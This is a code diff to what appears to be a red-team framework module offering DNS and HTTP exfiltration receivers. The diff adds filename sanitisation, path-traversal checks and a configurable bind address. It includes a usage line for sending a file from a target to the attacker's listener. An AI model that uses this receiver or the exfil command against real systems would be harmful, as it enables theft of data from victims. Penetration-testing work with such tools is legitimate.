@@ -36,6 +36,16 @@ DNS_QUERY_RE = re.compile(
     rb"\x00(?P<domain>[a-zA-Z0-9.-]+)\x00",
 )
 
+_SAFE_FILENAME_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9._\-+]{0,255}$")
+
+
+def _sanitize_filename(name: str) -> str:
+    """Return a safe basename from an untrusted input, falling back to a random name."""
+    stripped = os.path.basename(name).strip(" .")
+    if not stripped or not _SAFE_FILENAME_RE.match(stripped):
+        return f"upload_{int(time.time())}.bin"
+    return stripped
+
 
 class DNSExfilCommandSet(LazyOwnCommandSet):
     """DNS exfiltration and covert channel commands."""
@@ -109,7 +119,8 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
         import socket as sock_module
         sock = sock_module.socket(sock_module.AF_INET, sock_module.SOCK_DGRAM)
         sock.setsockopt(sock_module.SOL_SOCKET, sock_module.SO_REUSEADDR, 1)
-        sock.bind(("0.0.0.0", port))
+        bind_addr = self.params.get("lhost", "0.0.0.0")
+        sock.bind((bind_addr, port))
 
         print_msg(f"DNS exfil listener on UDP 0.0.0.0:{port}")
         if domain:
@@ -209,6 +220,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
         output_dir = self._extract(args, "--output") or "sessions/http_exfil"
 
         os.makedirs(output_dir, exist_ok=True)
+        output_dir = os.path.realpath(output_dir)
 
         try:
             from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -226,9 +238,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
                 file_name = self.headers.get("X-File-Name", f"upload_{int(time.time())}.bin")
                 file_hash = self.headers.get("X-File-Hash", "")
 
-                safe_name = os.path.basename(file_name)
-                if not safe_name:
-                    safe_name = f"upload_{int(time.time())}.bin"
+                safe_name = _sanitize_filename(file_name)
 
                 if chunk_idx is not None and chunk_total is not None:
                     stage_dir = os.path.join(output_dir, f".staging_{safe_name}")
@@ -244,14 +254,22 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
                             cp = os.path.join(stage_dir, f"chunk_{i:04d}")
                             if os.path.exists(cp):
                                 full_data += open(cp, "rb").read()
-                        out_path = os.path.join(output_dir, safe_name)
+                        out_path = os.path.realpath(os.path.join(output_dir, safe_name))
+                        if not out_path.startswith(output_dir + os.sep):
+                            self.send_response(403)
+                            self.end_headers()
+                            return
                         with open(out_path, "wb") as f:
                             f.write(full_data)
                         import shutil
                         shutil.rmtree(stage_dir, ignore_errors=True)
                         print_succ(f"Reassembled: {out_path} ({len(full_data)} bytes)")
                 else:
-                    out_path = os.path.join(output_dir, safe_name)
+                    out_path = os.path.realpath(os.path.join(output_dir, safe_name))
+                    if not out_path.startswith(output_dir + os.sep):
+                        self.send_response(403)
+                        self.end_headers()
+                        return
                     with open(out_path, "wb") as f:
                         f.write(data)
                     print_succ(f"Received: {out_path} ({len(data)} bytes)")
@@ -263,7 +281,8 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
             def log_message(self, fmt, *args):
                 pass
 
-        server = HTTPServer(("0.0.0.0", port), ExfilHandler)
+        bind_addr = self.params.get("lhost", "0.0.0.0")
+        server = HTTPServer((bind_addr, port), ExfilHandler)
         print_msg(f"HTTP exfil receiver on http://0.0.0.0:{port}")
         print_msg(f"Output: {output_dir}")
         print_msg(f"Usage from target: exfil_http <file> --url http://{self.params.get('lhost', '<lhost>')}:{port}")
